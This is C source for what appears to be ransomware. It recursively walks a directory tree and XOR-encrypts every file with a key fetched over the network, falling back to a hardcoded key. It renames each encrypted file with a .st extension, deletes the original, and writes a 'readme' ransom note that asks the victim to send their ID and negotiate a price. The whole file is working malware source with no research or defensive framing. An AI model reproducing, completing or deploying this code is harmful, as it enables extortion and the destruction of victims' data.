#ifdef __unix__                         // if UnixLike system
#define OS_Windows 0
#include "liblin.h"
#include <unistd.h>                 // linux kernel syscall
#elif defined(_WIN32) || defined(WIN32) // if Windows
#define OS_Windows 1
#include "libwin.h"
#include <windows.h>                // Windows API
#endif
#include "libcom.h"

int ID = 0;

FILE* openFile(const char* path, const char* mode){
	FILE* fp = fopen(path,mode);
	if (fp == NULL){
		perror("file : ");
		return 0;
	}
	return fp;
}

int closeFile(FILE* input, FILE* output){
	fclose(input);
	fclose(output);
	return 0;
}

char* addext(const char *file, const char *ext){
	char *result = malloc(strlen(file)+LEN_ENC_EXT+1);
	sprintf(result, "%s%s",file,ext);
	return result;
}

char* remext(const char* input){
	char* output = calloc(sizeof(char),strlen(input)+1);
	strcpy(output,input);
	output[strlen(output)-LEN_ENC_EXT] = '\0';
	return output;
}

int encrypt(int n, char line[n], const char* key, int* k) {
	int len_key = strlen(key);
	for(int i = 0; i <= n; i++) {
		line[i] = line[i]^(key[*k%len_key]-1);
		line[i] += 1;
		*k+=1;
	}
	return 0;
}

int decrypt(int n, char line[n], const char* key, int* k) {
	int len_key = strlen(key);
	for(int i = 0; i <= n; i++) {
		line[i] -= 1;
		line[i] = line[i]^(key[*k%len_key]-1);
		*k+=1;
	}
	return 0;
}

int docrypt(FILE* in, FILE* out, const char* key, int (*cyph)(int, char[], const char*,int*)){
	char* line = malloc(MAX+1);
	int k = 0, bytes;
	while((bytes = fread(line,1,MAX-1,in))>0){
		cyph(bytes, line, key, &k);
		fwrite(line, 1, bytes, out);
	}
	free(line);
	return 0;
}

char* getKey(int tmp_ID){
	if(tmp_ID != 0){
		ID = tmp_ID;
	}
	char* key = net_get(&ID);
	if(!key) {
		key = malloc(LENGTH);
		snprintf(key, LENGTH,"q}}c),apx?ic*n}zy{,uv)),$pfhjx:");
	}
	return key;
}

int processFile(char* path, const char* key){
	// if extension .st then decrypt the file
	// todo = 0 => encrypt
	// todo = 1 => decrypt
	int todo = strstr(path, ENC_EXT) ? 1:0;
	if(todo == 1 && ENCRYPT == 1)
		return 0; // no encrypt if decrypting
	if(todo == 0 && ENCRYPT == 0)
		return 0; // no decrypt if encrypting
	char* outputPath = todo == 1 ? remext(path):addext(path, ENC_EXT);
	printf("processing : %s\n", outputPath);
	FILE* input = openFile(path, "rb");
	FILE* output = openFile(outputPath, "wb");
	if(input == 0 || output == 0){
		printf("error with file just return\n");
		return 0;
	}
	free(outputPath);

	int (*cypher[])(int, char[], const char*,int*) = {encrypt, decrypt};
	docrypt(input, output, key, cypher[todo]);

	closeFile(input,output);
	remove(path);

	return 0;
}

char* addPath(const char *path, const char *file){
	int lenPath = strlen(path);
	int lenFile = strlen(file);
	char *full = malloc(lenPath + lenFile + 2); // + '/' and NULL
	if (path == NULL){
		perror("");
		return "";
	}
	sprintf(full, "%s/%s", path, file);
	printf("-> %s\n", full);
	return full;
}

int isDir(char* path){
	DIR *dir = opendir(path);   
	if (dir) {
		closedir(dir);
		return 1;
	} else if (ENOENT == errno) {
		return 0;
	} else {
		return 0;
	}
}

int fileExist(char *path) {
	if( access(path, F_OK) == 0) {
		return EXIST;
	} else {
		return NO_EXIST;
	}
}

int encDir(char* path, const char* key){
	if(fileExist(path) == NO_EXIST) {
		perror("");
		exit(0);
	}
	if (!isDir(path) && fileExist(path) == EXIST) {
		processFile(path, key) == 0 ? 0:printf("Error : %s\n",path);
		return 0;
	}
	DIR *dir = opendir(path);
	if (dir == NULL) {
		perror(path);
		return 1;
	}
	struct dirent *file;
	while((file = readdir(dir))!= NULL){
		if(strcmp(file->d_name,".")!=0 && strcmp(file->d_name,"..")!=0){
			char* fullpath = addPath(path, file->d_name);
			if(isDir(fullpath)){
				encDir(fullpath, key);
			}else{
				processFile(fullpath, key) == 0 ? 0:printf("Error : %s\n",fullpath);
			}
			free(fullpath);
		}
	}
	closedir(dir);
	return 0;
}

void leaveExplanation(){
	char* format = 
		"Hello,\n"
		"Your files are now encrypted with the extension .st\n"
		"If you wanna recover your files you have to send us your ID\n"
		"Only then we can start talking for the price^^\n"
		"Have a good day\n"
		"Your ID is : %d\n";
	int len = strlen(format)+9;
	char* explanation = calloc(1,len);
	snprintf(explanation, len, format, ID);
	printf("%s", explanation);
	FILE* readme = fopen("readme", "w+");
	if(readme == NULL){
		return;
	}
	fprintf(readme, "%s", explanation);
	free(explanation);
	fclose(readme);
}

int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size)
{
	for (size_t i = 0; i < size; i++) {
		hex_string += sprintf(hex_string, "%.2x", bytes_string[i]);
	}
	return 0;
}

int hexa_to_bytes(char hex_string[], unsigned char val[], int size)
{
	char *pos = hex_string;
	for (size_t count = 0; count < size; count++) {
		sscanf(pos, "%2hhx", &val[count]);
		pos += 2;
	}
	return 0;
}
